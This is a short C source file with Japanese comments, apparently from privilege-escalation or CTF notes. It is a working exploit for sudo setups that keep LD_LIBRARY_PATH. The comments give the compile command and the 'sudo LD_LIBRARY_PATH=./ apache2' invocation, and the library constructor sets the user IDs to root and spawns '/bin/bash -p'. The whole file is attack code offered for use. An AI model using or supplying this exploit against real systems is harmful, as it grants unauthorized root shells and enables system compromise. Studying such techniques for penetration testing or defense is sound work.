/*
 * 1. コンパイル
 * gcc -fPIC -shared -o ./libcrypt.so.1 ./library_path.c
 *
 * 2. LD_LIBRARY_PATH(上記のsoがあるディレクトリ)を指定して、sudoコマンド実行
 * sudo LD_LIBRARY_PATH=./ apache2
 */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
